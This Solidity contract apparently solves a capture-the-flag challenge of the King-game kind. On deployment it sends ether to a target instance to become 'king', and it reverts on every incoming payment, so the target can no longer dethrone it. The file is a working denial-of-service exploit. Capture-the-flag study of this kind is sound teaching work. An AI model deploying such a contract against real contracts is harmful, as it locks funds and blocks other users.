// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {

    // send ether to the instance address while creating this contract.
    constructor(address payable instanceAddress) payable {
        (bool s, ) = instanceAddress.call{value: 1000000000000000}("");
        require(s, "Failed");
    }

    // don't accept any ether from anyone else to become king!
    receive() external payable {
        revert();
    }
}